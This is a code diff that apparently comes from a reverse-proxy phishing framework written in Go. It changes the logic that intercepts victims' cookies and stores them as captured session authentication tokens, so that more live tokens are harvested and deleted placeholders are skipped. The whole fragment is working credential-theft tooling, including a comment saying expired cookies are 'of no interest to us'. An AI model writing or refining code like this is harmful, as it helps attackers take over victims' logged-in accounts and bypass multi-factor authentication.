@@ -888,8 +888,8 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					at := pl.getAuthToken(c_domain, ck.Name)
 					if at != nil {
 						s, ok := p.sessions[ps.SessionId]
-						if ok && (s.IsAuthUrl || !s.IsDone) {
-							if ck.Value != "" && (at.always || ck.Expires.IsZero() || time.Now().Before(ck.Expires)) { // cookies with empty values or expired cookies are of no interest to us
+						if ok && (!s.IsDone) {
+							if ck.Value != "" && ck.Value != "DELETE" && (at.always || ck.Expires.IsZero() || time.Now().Before(ck.Expires)) { // cookies with empty values or expired cookies are of no interest to us
 								log.Debug("session: %s: %s = %s", c_domain, ck.Name, ck.Value)
 								s.AddCookieAuthToken(c_domain, ck.Name, ck.Value, ck.Path, ck.HttpOnly, ck.Expires)
 							}
